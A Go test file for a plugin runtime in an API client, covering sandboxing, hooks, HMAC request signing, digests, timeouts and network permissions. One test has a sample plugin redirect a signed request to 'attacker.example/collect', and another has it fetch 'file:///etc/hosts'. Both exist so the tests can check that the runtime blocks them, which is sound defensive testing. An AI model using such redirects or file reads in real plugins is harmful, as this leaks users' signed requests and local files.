package plugins

import (
	"crypto/hmac"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"errors"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/awake-client/awake/src/domain"
)

func TestLoadRuntimeRequiresHandlersMatchingTheManifest(t *testing.T) {
	cases := []struct {
		name     string
		bundle   string
		expected string
	}{
		{"never registers", `const nothing = 1;`, "did not call awake.register"},
		{"missing variable", `awake.register({ beforeRequest() {}, authentication: { sign() {} } })`, `dynamicVariables "$now" is declared but not registered`},
		{"extra variable", `awake.register({ beforeRequest() {}, dynamicVariables: { $now() {}, $extra() {} }, authentication: { sign() {} } })`, `dynamicVariables "$extra" is registered but not declared`},
		{"undeclared hook", `awake.register({ beforeRequest() {}, afterResponse() {}, dynamicVariables: { $now() {} }, authentication: { sign() {} } })`, "hook afterResponse is registered but not declared"},
		{"missing hook", `awake.register({ dynamicVariables: { $now() {} }, authentication: { sign() {} } })`, "hook beforeRequest is declared but not registered"},
		{"unknown group", `awake.register({ beforeRequest() {}, dynamicVariables: { $now() {} }, authentication: { sign() {} }, onSave() {} })`, `unknown handler group "onSave"`},
		{"registers twice", `awake.register({}); awake.register({});`, "call it once"},
		{"throws", `throw new Error("broken bundle")`, "broken bundle"},
	}

	manifest := testRuntimeManifest()
	manifest.Contributes = Contributions{
		Hooks:            []Hook{HookBeforeRequest},
		DynamicVariables: []DynamicVariableContribution{{Name: "$now"}},
		Authentication:   []AuthenticationContribution{{Type: "sign", Label: "Sign"}},
	}
	for _, test := range cases {
		t.Run(test.name, func(t *testing.T) {
			_, err := LoadRuntime(manifest, []byte(test.bundle), RuntimeOptions{})
			if err == nil || !strings.Contains(err.Error(), test.expected) {
				t.Fatalf("expected %q, got %v", test.expected, err)
			}
		})
	}
}

func TestRuntimeHasNoModuleLoaderAndNoNetworkWithoutPermission(t *testing.T) {
	manifest := testRuntimeManifest()
	manifest.Contributes.DynamicVariables = []DynamicVariableContribution{{Name: "$globals"}}
	runtime := loadTestRuntime(t, manifest, `awake.register({ dynamicVariables: {
		$globals: () => [typeof require, typeof process, typeof fetch, typeof awake.http].join(","),
	} })`)

	value, _, err := runtime.DynamicVariable("$globals")
	if err != nil {
		t.Fatal(err)
	}
	if value != "undefined,undefined,undefined,undefined" {
		t.Errorf("expected no module loader, process, fetch or awake.http, got %s", value)
	}
}

func TestRuntimeComputesDynamicVariablesFromSettings(t *testing.T) {
	manifest := testRuntimeManifest()
	manifest.Contributes.DynamicVariables = []DynamicVariableContribution{{Name: "$greeting"}}
	runtime := loadTestRuntimeWith(t, manifest, `awake.register({ dynamicVariables: {
		$greeting: (context) => { awake.log("computing"); return context.settings.word + " " + awake.settings.word; },
	} })`, RuntimeOptions{Settings: map[string]string{"word": "hello"}})

	value, log, err := runtime.DynamicVariable("$greeting")
	if err != nil {
		t.Fatal(err)
	}
	if value != "hello hello" || len(log.Lines) != 1 || log.Lines[0] != "computing" {
		t.Errorf("unexpected value %q and logs %v", value, log.Lines)
	}
}

func TestRuntimeHooksChangeTheRequestAndTheVariables(t *testing.T) {
	manifest := testRuntimeManifest()
	manifest.Contributes.Hooks = []Hook{HookBeforeRequest, HookAfterResponse}
	runtime := loadTestRuntime(t, manifest, `awake.register({
		beforeRequest(context) {
			context.request.headers["X-Greeting"] = "hello";
			context.request.query["page"] = "2";
			context.variables.seen = context.variables.base;
		},
		afterResponse(context) {
			context.variables.token = context.response.json().token;
			console.warn("status", context.response.status);
		},
	})`)

	request := domain.Request{Method: domain.MethodGet, URL: "https://example.com/users", Body: &domain.Body{Type: domain.BodyNone}}
	variables := map[string]string{"base": "https://example.com"}
	if _, err := runtime.BeforeRequest(&request, variables); err != nil {
		t.Fatalf("before request: %v", err)
	}
	if len(request.Headers) != 1 || request.Headers[0].Name != "X-Greeting" || request.Parameters[0].Value != "2" {
		t.Errorf("unexpected request: %+v", request)
	}
	if variables["seen"] != "https://example.com" {
		t.Errorf("unexpected variables: %v", variables)
	}

	log, err := runtime.AfterResponse(request, domain.ScriptResponse{StatusCode: 200, Body: `{"token":"abc"}`}, variables)
	if err != nil {
		t.Fatalf("after response: %v", err)
	}
	if variables["token"] != "abc" || len(log.Lines) != 1 || log.Lines[0] != "warning: status 200" {
		t.Errorf("unexpected variables %v and logs %v", variables, log.Lines)
	}
}

func TestRuntimeAuthenticationSignsTheFinalRequest(t *testing.T) {
	manifest := testRuntimeManifest()
	manifest.Contributes.Authentication = []AuthenticationContribution{{Type: "hmac", Label: "HMAC"}}
	runtime := loadTestRuntime(t, manifest, `awake.register({ authentication: {
		hmac(context) {
			const signature = awake.crypto.hmacSha256(context.fields.secret, context.request.method + context.request.body);
			context.request.headers["X-Signature"] = signature;
			delete context.request.headers["X-Remove"];
			context.request.url = context.request.url + "&signed=1";
		},
	} })`)

	httpRequest, err := http.NewRequest(http.MethodPost, "https://api.example.com/items?a=1", strings.NewReader("payload"))
	if err != nil {
		t.Fatal(err)
	}
	httpRequest.Header.Set("X-Remove", "gone")
	httpRequest.Header.Set("Content-Type", "text/plain")
	if _, err := runtime.Authenticate("hmac", httpRequest, map[string]string{"secret": "key"}); err != nil {
		t.Fatalf("authenticate: %v", err)
	}

	mac := hmac.New(sha256.New, []byte("key"))
	mac.Write([]byte("POSTpayload"))
	expected := hex.EncodeToString(mac.Sum(nil))
	if signature := httpRequest.Header.Get("X-Signature"); signature != expected {
		t.Errorf("unexpected signature %q", signature)
	}
	if httpRequest.Header.Get("X-Remove") != "" || httpRequest.Header.Get("Content-Type") != "text/plain" {
		t.Errorf("unexpected headers: %v", httpRequest.Header)
	}
	if httpRequest.URL.RawQuery != "a=1&signed=1" {
		t.Errorf("unexpected URL: %s", httpRequest.URL)
	}
	body, err := io.ReadAll(httpRequest.Body)
	if err != nil || string(body) != "payload" {
		t.Errorf("the body must still be sent, got %q: %v", body, err)
	}
}

func TestRuntimeCryptoMatchesKnownDigests(t *testing.T) {
	manifest := testRuntimeManifest()
	manifest.Contributes.DynamicVariables = []DynamicVariableContribution{{Name: "$digests"}}
	runtime := loadTestRuntime(t, manifest, `awake.register({ dynamicVariables: {
		$digests: () => [
			awake.crypto.sha256("abc"),
			awake.crypto.hmacSha256("key", "The quick brown fox jumps over the lazy dog"),
			awake.crypto.hmacSha256("6b6579", "The quick brown fox jumps over the lazy dog", "hex"),
			awake.encoding.base64Encode("awake"),
			awake.encoding.base64Decode("YXdha2U="),
		].join(" "),
	} })`)

	value, _, err := runtime.DynamicVariable("$digests")
	if err != nil {
		t.Fatal(err)
	}
	expected := strings.Join([]string{
		"ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad",
		"f7bc83f430538424b13298e6aa6fb143ef4d59a14946175997479dbc2d1a3cd8",
		"f7bc83f430538424b13298e6aa6fb143ef4d59a14946175997479dbc2d1a3cd8",
		"YXdha2U=",
		"awake",
	}, " ")
	if value != expected {
		t.Errorf("unexpected digests:\n%s\nexpected:\n%s", value, expected)
	}
}

func TestRuntimeAuthenticationCannotRedirectTheRequest(t *testing.T) {
	manifest := testRuntimeManifest()
	manifest.Contributes.Authentication = []AuthenticationContribution{{Type: "steal", Label: "Steal"}}
	runtime := loadTestRuntime(t, manifest, `awake.register({ authentication: {
		steal(context) { context.request.url = "https://attacker.example/collect"; },
	} })`)

	httpRequest, err := http.NewRequest(http.MethodGet, "https://api.example.com/items", nil)
	if err != nil {
		t.Fatal(err)
	}
	_, err = runtime.Authenticate("steal", httpRequest, nil)

	if err == nil || !strings.Contains(err.Error(), "another server") {
		t.Fatalf("expected the redirection to be refused, got %v", err)
	}
	if httpRequest.URL.Host != "api.example.com" {
		t.Errorf("the request must keep its server, got %s", httpRequest.URL)
	}
}

func TestRuntimeImportsAndExportsDocuments(t *testing.T) {
	manifest := testRuntimeManifest()
	manifest.Contributes.ImportFormats = []FormatContribution{{Format: "lines", Label: "Lines"}}
	manifest.Contributes.ExportFormats = []FormatContribution{{Format: "lines", Label: "Lines"}, {Format: "broken", Label: "Broken"}}
	runtime := loadTestRuntime(t, manifest, `awake.register({
		importFormats: {
			lines: (context) => [{
				name: context.fileName,
				requests: context.content.split("\n").map((url, index) => ({ name: "Request " + index, request: { method: "GET", url } })),
			}],
		},
		exportFormats: {
			lines: (context) => context.collections.flatMap((collection) => collection.requests.map((entry) => entry.request.url)).join("\n"),
			broken: () => 42,
		},
	})`)

	imported, _, err := runtime.Import("lines", "api.txt", "https://a.example\nhttps://b.example")
	if err != nil {
		t.Fatalf("import: %v", err)
	}
	var collections []map[string]any
	if err := json.Unmarshal(imported, &collections); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if collections[0]["name"] != "api.txt" || len(collections[0]["requests"].([]any)) != 2 {
		t.Errorf("unexpected collections: %s", imported)
	}

	exported, _, err := runtime.Export("lines", imported)
	if err != nil {
		t.Fatalf("export: %v", err)
	}
	if exported != "https://a.example\nhttps://b.example" {
		t.Errorf("unexpected export: %q", exported)
	}
	if _, _, err := runtime.Export("broken", imported); err == nil || !strings.Contains(err.Error(), "as a string") {
		t.Errorf("expected a non string export to be refused, got %v", err)
	}
}

func TestRuntimeStopsALoopingHandlerAndStaysUsable(t *testing.T) {
	manifest := testRuntimeManifest()
	manifest.Contributes.DynamicVariables = []DynamicVariableContribution{{Name: "$loop"}, {Name: "$fine"}}
	runtime := loadTestRuntimeWith(t, manifest, `awake.register({ dynamicVariables: {
		$loop: () => { for (;;) {} },
		$fine: () => "fine",
	} })`, RuntimeOptions{CallTimeout: 30 * time.Millisecond})

	if _, _, err := runtime.DynamicVariable("$loop"); err == nil || !strings.Contains(err.Error(), "timed out") {
		t.Fatalf("expected a timeout, got %v", err)
	}
	if value, _, err := runtime.DynamicVariable("$fine"); err != nil || value != "fine" {
		t.Fatalf("expected the runtime to stay usable, got %q: %v", value, err)
	}
}

func TestLoadRuntimeStopsALoopingBundle(t *testing.T) {
	_, err := LoadRuntime(testRuntimeManifest(), []byte(`for (;;) {}`), RuntimeOptions{LoadTimeout: 30 * time.Millisecond})

	if err == nil || !strings.Contains(err.Error(), "timed out") {
		t.Fatalf("expected a timeout, got %v", err)
	}
}

func TestRuntimeSettlesAsyncHandlers(t *testing.T) {
	manifest := testRuntimeManifest()
	manifest.Contributes.DynamicVariables = []DynamicVariableContribution{{Name: "$async"}, {Name: "$rejected"}, {Name: "$pending"}}
	runtime := loadTestRuntime(t, manifest, `awake.register({ dynamicVariables: {
		$async: async () => { const value = await Promise.resolve("settled"); return value; },
		$rejected: async () => { throw new Error("refused"); },
		$pending: () => new Promise(() => {}),
	} })`)

	if value, _, err := runtime.DynamicVariable("$async"); err != nil || value != "settled" {
		t.Errorf("expected the async value, got %q: %v", value, err)
	}
	if _, _, err := runtime.DynamicVariable("$rejected"); err == nil || !strings.Contains(err.Error(), "refused") {
		t.Errorf("expected the rejection, got %v", err)
	}
	if _, _, err := runtime.DynamicVariable("$pending"); !errors.Is(err, ErrAsynchronousResult) {
		t.Errorf("expected ErrAsynchronousResult, got %v", err)
	}
}

func TestRuntimeFetchesWithTheNetworkPermission(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(writer http.ResponseWriter, request *http.Request) {
		body, _ := io.ReadAll(request.Body)
		writer.Header().Set("Content-Type", "application/json")
		_, _ = writer.Write([]byte(`{"method":"` + request.Method + `","header":"` + request.Header.Get("X-Test") + `","body":"` + string(body) + `"}`))
	}))
	defer server.Close()

	manifest := testRuntimeManifest()
	manifest.Permissions = []Permission{PermissionNetwork}
	manifest.Contributes.DynamicVariables = []DynamicVariableContribution{{Name: "$remote"}, {Name: "$file"}}
	runtime := loadTestRuntimeWith(t, manifest, `awake.register({ dynamicVariables: {
		$remote: (context) => {
			const response = awake.http.fetch(context.settings.url, { method: "post", headers: { "X-Test": "yes" }, body: "ping" });
			const json = response.json();
			return [response.status, json.method, json.header, json.body].join(" ");
		},
		$file: () => awake.http.fetch("file:///etc/hosts").body,
	} })`, RuntimeOptions{Settings: map[string]string{"url": server.URL}, HTTPClient: server.Client(), CallTimeout: time.Second})

	value, _, err := runtime.DynamicVariable("$remote")
	if err != nil {
		t.Fatalf("fetch: %v", err)
	}
	if value != "200 POST yes ping" {
		t.Errorf("unexpected response %q", value)
	}
	if _, _, err := runtime.DynamicVariable("$file"); err == nil || !strings.Contains(err.Error(), "not an http or https URL") {
		t.Errorf("expected a file URL to be refused, got %v", err)
	}
}

func testRuntimeManifest() Manifest {
	return Manifest{Version: 1, ID: "example", Name: "Example", PluginVersion: "1.0.0", Main: "dist/plugin.js"}
}

func loadTestRuntime(t *testing.T, manifest Manifest, bundle string) *Runtime {
	t.Helper()
	return loadTestRuntimeWith(t, manifest, bundle, RuntimeOptions{})
}

func loadTestRuntimeWith(t *testing.T, manifest Manifest, bundle string, options RuntimeOptions) *Runtime {
	t.Helper()

	runtime, err := LoadRuntime(manifest, []byte(bundle), options)
	if err != nil {
		t.Fatalf("load: %v", err)
	}
	return runtime
}
